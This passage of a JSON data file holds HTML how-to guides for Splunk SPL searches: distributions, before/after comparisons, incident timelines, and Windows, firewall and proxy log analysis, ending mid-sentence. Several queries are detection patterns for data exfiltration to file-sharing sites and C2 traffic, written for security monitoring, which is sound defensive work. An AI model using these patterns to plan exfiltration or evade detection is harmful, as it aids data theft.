available:</p>\n                        <ul>\n                            <li><code>Country</code> - Country name</li>\n                            <li><code>Region</code> - State/province</li>\n                            <li><code>City</code> - City name</li>\n                            <li><code>lat</code> - Latitude</li>\n                            <li><code>lon</code> - Longitude</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout warning\">\n                    <div class=\"guide-callout-title\">Heads Up</div>\n                    <p>IP geolocation isn't 100% accurate, especially for VPNs, proxies, and mobile IPs. It's useful for broad patterns but don't rely on it for precise location.</p>\n                </div>\n            "
      },
      {
        "id": "viz-distribution",
        "title": "How to visualize distribution",
        "description": "Show how values are spread using histograms and percentiles.",
        "keywords": "histogram distribution percentile spread range bin bucket",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to understand the spread of values - are response times mostly fast with some outliers? What's the typical file size? Is the data clustered or evenly distributed?</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Creating Histograms</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Basic histogram with bin</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web\n| bin response_time span=100\n| stats count by response_time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Groups response times into 100ms buckets. Shows distribution shape.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Auto-binning</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web\n| bin response_time bins=20\n| stats count by response_time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Splunk auto-picks bucket size to create 20 bins.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Log-scale buckets (for wide ranges)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=proxy\n| eval size_bucket=case(\n    bytes<1024, \"<1KB\",\n    bytes<10240, \"1-10KB\",\n    bytes<102400, \"10-100KB\",\n    bytes<1048576, \"100KB-1MB\",\n    bytes<10485760, \"1-10MB\",\n    true(), \">10MB\")\n| stats count by size_bucket</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Custom buckets for file sizes that span many orders of magnitude.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Percentile Analysis</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Key percentiles</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web\n| stats min(response_time) as min,\n        perc50(response_time) as median,\n        perc90(response_time) as p90,\n        perc99(response_time) as p99,\n        max(response_time) as max</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows the full distribution: minimum, median, 90th and 99th percentile, and maximum.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Percentiles by category</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web\n| stats perc50(response_time) as median,\n        perc95(response_time) as p95 by uri\n| sort -p95</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find which endpoints have the worst 95th percentile response times.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Real-World Scenarios</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Response time SLA compliance</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web\n| stats count(eval(response_time<500)) as under_sla, count as total\n| eval compliance_pct=round(under_sla/total*100, 1)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Percentage of requests meeting 500ms SLA.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Identify outliers</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web\n| eventstats perc99(response_time) as p99\n| where response_time > p99\n| table _time, uri, response_time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find the worst 1% of response times - the true outliers.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Data transfer size patterns</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=proxy\n| bin bytes span=1048576\n| stats count by bytes\n| eval size_MB=bytes/1048576\n| table size_MB, count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Distribution of file download sizes in 1MB buckets.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>When analyzing performance data, focus on percentiles over averages. An average of 200ms doesn't tell you that 1% of users experience 5 second delays. P99 does.</p>\n                </div>\n            "
      },
      {
        "id": "viz-before-after",
        "title": "How to create before/after comparisons",
        "description": "Compare metrics between two time periods to show change impact.",
        "keywords": "compare before after change impact difference delta trend",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to compare two time periods - did the firewall change reduce traffic? Are errors up after the deploy? How does this week compare to last week?</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Technique 1: appendcols</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">This week vs last week</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web status>=500 earliest=-7d\n| stats count as this_week\n| appendcols [search index=web status>=500 earliest=-14d latest=-7d\n    | stats count as last_week]\n| eval change_pct=round((this_week-last_week)/last_week*100, 1)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Compare error counts and calculate percentage change.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Before/after a specific time</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=firewall action=blocked earliest=-2d\n| stats count as after_change\n| appendcols [search index=firewall action=blocked earliest=-4d latest=-2d\n    | stats count as before_change]\n| eval reduction_pct=round((before_change-after_change)/before_change*100, 1)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Measure impact of a change made 2 days ago.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Technique 2: Comparing Over Time</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Overlay this week on last week</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web\n| eval period=if(_time>relative_time(now(), \"-7d\"), \"This Week\", \"Last Week\")\n| eval normalized_time=if(period=\"Last Week\", _time+604800, _time)\n| bin normalized_time span=1h\n| timechart span=1h count by period</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows both weeks on the same timeline for visual comparison.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Hour-by-hour comparison</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web earliest=-14d\n| eval week=if(_time>relative_time(now(), \"-7d\"), \"Current\", \"Previous\")\n| eval hour=strftime(_time, \"%H\")\n| stats count by hour, week\n| xyseries hour week count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Compare traffic patterns by hour of day between two weeks.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Real-World Scenarios</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Post-deployment error monitoring</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=application level=ERROR\n| eval period=if(_time>strptime(\"2024-01-15 14:00\", \"%Y-%m-%d %H:%M\"),\n                 \"After Deploy\", \"Before Deploy\")\n| stats count by period, error_type\n| xyseries error_type period count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Compare error types before/after a deploy at 2 PM on Jan 15.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Measure policy effectiveness</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| multisearch\n    [search index=firewall action=blocked earliest=-7d | stats count as blocked_after]\n    [search index=firewall action=blocked earliest=-14d latest=-7d | stats count as blocked_before]\n| stats values(blocked_after) as after, values(blocked_before) as before\n| eval effectiveness=round((after-before)/before*100, 1).\"%\"</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Measure if new firewall rules are blocking more threats.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>When showing before/after, always use the same time duration for both periods. Comparing 2 days before to 1 day after gives misleading results.</p>\n                </div>\n            "
      },
      {
        "id": "viz-event-timeline",
        "title": "How to build a timeline of events",
        "description": "Create chronological views showing the sequence of events during an incident.",
        "keywords": "timeline sequence chronological order incident investigation transaction",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to reconstruct what happened in order - show the sequence of an attack, trace a user's activity, or understand the timeline of an incident.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Simple Event Timeline</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Basic chronological table</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user=jsmith earliest=-1d\n| table _time, action, src_ip, dest, status\n| sort _time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">All events for a user in time order. The foundation of timeline analysis.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Formatted timestamps</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user=jsmith earliest=-1d\n| eval time=strftime(_time, \"%H:%M:%S\")\n| table time, action, src_ip, dest\n| sort _time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Human-readable time format for easier reading.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Multi-Source Timelines</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Combine multiple data sources</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user=jsmith OR src_ip=192.168.1.100\n| eval source=case(\n    sourcetype=\"WinEventLog:Security\", \"Windows\",\n    sourcetype=\"linux_secure\", \"Linux\",\n    sourcetype=\"pan:traffic\", \"Firewall\",\n    true(), sourcetype)\n| table _time, source, action, dest, status\n| sort _time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Unified timeline across Windows, Linux, and firewall logs.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Add time gaps</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user=jsmith earliest=-1d\n| sort _time\n| streamstats current=false last(_time) as prev_time\n| eval gap_seconds=_time-prev_time\n| eval gap=if(gap_seconds>300, \" \".tostring(gap_seconds/60, \"duration\"), \"\")\n| table _time, gap, action, src_ip, dest</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Highlight time gaps longer than 5 minutes - shows breaks in activity.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Real-World Scenarios</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Attack reconstruction</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=* (user=compromised_user OR src_ip=attacker_ip) earliest=-24h\n| eval phase=case(\n    action=\"login\", \"1-Initial Access\",\n    action=\"exec\", \"2-Execution\",\n    action=\"copy\", \"3-Collection\",\n    action=\"upload\", \"4-Exfiltration\",\n    true(), \"0-Other\")\n| table _time, phase, host, action, details\n| sort _time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Map events to attack phases for incident reporting.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Session reconstruction</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=proxy user=jsmith earliest=-8h\n| transaction user maxpause=30m\n| table _time, duration, eventcount, values(url)\n| sort _time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Group activity into sessions (30 min idle = new session).</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Process execution chain</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=endpoint host=infected_host EventCode=4688 earliest=-1h\n| table _time, ParentProcessName, NewProcessName, CommandLine\n| sort _time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Process execution timeline showing what spawned what.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>For incident reports, add a <code>| eval description=\"...\"</code> to annotate key events. This creates a narrative that's easier to follow than raw log data.</p>\n                </div>\n            "
      }
    ],
    "datasources": [
      {
        "id": "windows-event-logs",
        "title": "How to work with Windows Event Logs",
        "description": "Navigate Windows Security, System, and Application event logs effectively.",
        "keywords": "windows event log eventcode security 4624 4625 4688",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to search and analyze Windows Event Logs - the primary source for Windows security monitoring.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Finding Windows Logs</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Common sourcetypes</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=windows sourcetype=\"WinEventLog:Security\"</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Security events. Also: <code>WinEventLog:System</code>, <code>WinEventLog:Application</code>, <code>XmlWinEventLog</code>.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Key Security Event Codes</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Authentication events</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=windows sourcetype=\"WinEventLog:Security\" EventCode IN (4624, 4625, 4634, 4647)\n| stats count by EventCode\n| eval description = case(\n    EventCode=4624, \"Successful login\",\n    EventCode=4625, \"Failed login\",\n    EventCode=4634, \"Logoff\",\n    EventCode=4647, \"User initiated logoff\"\n)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Core authentication events. 4624=success, 4625=failure.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Process execution</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=windows EventCode=4688\n| stats count by New_Process_Name, Creator_Process_Name\n| sort - count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Process creation events - essential for endpoint detection.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Account management</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=windows EventCode IN (4720, 4722, 4724, 4728, 4732, 4756)\n| stats count by EventCode, TargetUserName, SubjectUserName</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">User/group changes: created (4720), enabled (4722), password reset (4724), group membership changes.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Logon Types</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Understand how users connected</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=windows EventCode=4624\n| stats count by Logon_Type\n| eval type_name = case(\n    Logon_Type=2, \"Interactive (console)\",\n    Logon_Type=3, \"Network\",\n    Logon_Type=4, \"Batch\",\n    Logon_Type=5, \"Service\",\n    Logon_Type=7, \"Unlock\",\n    Logon_Type=10, \"RemoteInteractive (RDP)\",\n    Logon_Type=11, \"CachedInteractive\"\n)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Type 10 = RDP, Type 3 = network shares/remote access, Type 2 = local keyboard.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Filter out noise: <code>NOT user=\"*$\"</code> removes computer accounts (they end in $). <code>NOT Logon_Type=3</code> removes noisy network logons if focusing on interactive sessions.</p>\n                </div>\n            "
      },
      {
        "id": "firewall-logs",
        "title": "How to work with firewall logs",
        "description": "Analyze network traffic, blocked connections, and security events from firewalls.",
        "keywords": "firewall network traffic blocked allowed connection palo cisco",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to analyze firewall logs to understand network traffic, find blocked threats, and investigate connections.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Finding Firewall Logs</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Common sourcetypes</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=network sourcetype IN (pan:traffic, cisco:asa, fortinet_traffic)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Depends on your firewall. Check with <code>| stats count by sourcetype</code> in your network index.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Using CIM-normalized fields</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=network tag=network tag=communicate\n| stats count by action, src_ip, dest_ip, dest_port</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">CIM fields work across vendors: src_ip, dest_ip, dest_port, action, bytes_in, bytes_out.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Traffic Analysis</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Top talkers (by volume)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=network\n| stats sum(bytes) as total_bytes by src_ip\n| sort - total_bytes\n| head 20\n| eval total_gb = round(total_bytes/1024/1024/1024, 2)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Who's sending the most data? Large outbound = potential exfiltration.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Top destinations</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=network action=allowed\n| stats sum(bytes) as bytes, dc(src_ip) as sources by dest_ip\n| sort - bytes\n| head 20</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Most accessed destinations. Many sources to one dest might indicate C2 or popular service.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Security Analysis</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Blocked connections</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=network action IN (blocked, denied, drop)\n| stats count by src_ip, dest_ip, dest_port\n| sort - count\n| head 50</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">What's being blocked? High counts might indicate attacks or misconfigurations.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Unusual ports</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=network dest_port > 1024 NOT dest_port IN (3389, 8080, 8443, 443)\n| stats dc(src_ip) as sources, sum(bytes) as bytes by dest_port\n| where sources > 5\n| sort - bytes</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">High ports used by multiple sources - possible C2 or unauthorized services.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Use <code>| iplocation dest_ip</code> to add geographic context. Outbound traffic to unexpected countries is worth investigating.</p>\n                </div>\n            "
      },
      {
        "id": "proxy-web-logs",
        "title": "How to work with proxy and web logs",
        "description": "Analyze web traffic, detect threats, and investigate user browsing activity.",
        "keywords": "proxy web traffic http url browsing squid bluecoat zscaler",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to analyze web/proxy logs to investigate browsing activity, detect malicious sites, and find data exfiltration.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Finding Proxy Logs</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Common sourcetypes</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=proxy sourcetype IN (bluecoat:proxysg, squid, zscalernss-web)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Varies by vendor. Use CIM tag <code>tag=web</code> for normalized access.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">CIM-normalized web data</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=proxy tag=web\n| stats count by user, url, status, action</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Common CIM fields: url, uri_path, user, src_ip, dest, status, action, bytes_in, bytes_out.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">User Activity Analysis</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Sites visited by user</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=proxy user=jsmith\n| rex field=url \"https?://(?<domain>[^/]+)\"\n| stats count, sum(bytes_out) as uploaded by domain\n| sort - count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">What sites did this user visit? How much data did they upload?</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Top bandwidth users</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=proxy\n| stats sum(bytes_in) as download, sum(bytes_out) as upload by user\n| eval total = download + upload\n| sort - total\n| head 20</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Who's using the most bandwidth? High upload = potential exfiltration.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Threat Detection</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Blocked malicious sites</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=proxy action=blocked category IN (malware, phishing, \"command-and-control\")\n| stats count by user, url, category\n| sort - count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Users hitting blocked threat categories. Multiple hits = possible infection.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Uploads to file sharing sites</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=proxy http_method=POST bytes_out > 1000000\n| rex field=url \"https?://(?<domain>[^/]+)\"\n| search domain IN (*dropbox*, *drive.google*, *onedrive*, *wetransfer*, *mega.nz*)\n| stats sum(bytes_out) as uploaded by user, domain</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Large uploads to file sharing - potential data exfiltration.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout warning\">\n                    <div class=\"guide-callout-title\">Watch For</div>\n                    <p>Repeated connections to newly registered domains, raw IP URLs, or unusual TLDs (.tk, .top, .xyz). These are common in phishing and malware infrastructure.</p>\n                </div>\n            "
      }
    ],
    "enriching": [
      {
        "id": "use-lookups",
        "title": "How to use lookups",
        "description": "Enrich your events with external data like asset info, user details, or threat intelligence.",
        "keywords": "lookup enrich context asset user threat intel csv",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to add context to your events - turn IP addresses into hostnames, user IDs into names, or match against threat intelligence.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Basic Lookup</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Add fields from a lookup</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security\n| lookup user_info.csv user OUTPUT department, manager, title</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">For each event, look up the <code>user</code> in user_info.csv and add department, manager, and title fields.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Map field names with AS</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=network\n| lookup assets.csv ip AS src_ip OUTPUT hostname, owner, criticality</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Match src_ip in events to the \"ip\" column in the lookup. Add hostname, owner, criticality.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Lookup Options</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Only add if field doesn't exist</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | lookup assets.csv ip AS src_ip OUTPUTNEW hostname</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\"><code>OUTPUTNEW</code> only adds the field if it doesn't already exist in the event.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Output all lookup fields</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | lookup assets.csv ip AS src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Without OUTPUT, adds all fields from the matching lookup row.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Threat Intelligence Matching</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Check IPs against threat list</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=network\n| lookup threat_intel.csv ip AS dest_ip OUTPUTNEW threat_type, confidence\n| where isnotnull(threat_type)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Match destination IPs against threat intel. Only keep events that matched.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Query a Lookup Directly</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">See what's in the lookup</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| inputlookup assets.csv\n| head 100</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">View lookup contents. Useful for understanding available fields.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Lookups are fast because they're loaded into memory. For large reference data (millions of rows), consider KV Store collections instead of CSV lookups.</p>\n                </div>\n            "
      },
      {
        "id": "join-data-sources",
        "title": "How to join data from different sources",
        "description": "Combine events from different indexes or sourcetypes based on a common field.",
        "keywords": "join combine correlate multiple sources subsearch",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to correlate data from different sources - like matching authentication logs with VPN logs, or combining user activity with HR data.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using Join</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Basic join</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user=*\n| join user [search index=hr | table user, department, manager]</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Add HR info to security events by matching on user. INNER join - events without matches are dropped.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Left join (keep all main events)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user=*\n| join type=left user [search index=hr | table user, department]</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\"><code>type=left</code> keeps all security events, even if no HR match. Unmatched fields are empty.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using Stats (Often Better)</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Append and combine with stats</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=failure\n| append [search index=security action=success]\n| stats count(eval(action=\"failure\")) as failures,\n        count(eval(action=\"success\")) as successes by user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Append combines result sets. Stats then aggregates across both. More flexible than join.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Multiple indexes, same stats</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>(index=auth OR index=vpn) user=*\n| stats count by user, index\n| xyseries user index count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Search multiple indexes at once, then pivot the results.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Subsearch for Filtering</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Find events for users in another list</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security\n    [search index=hr status=terminated | fields user | format]\n| stats count by user, action</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find security events for terminated users. Subsearch returns a list of users to match.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout warning\">\n                    <div class=\"guide-callout-title\">Watch Out</div>\n                    <p>Join holds the subsearch results in memory - limited to 50,000 rows by default. For large datasets, consider using <code>lookup</code> (for 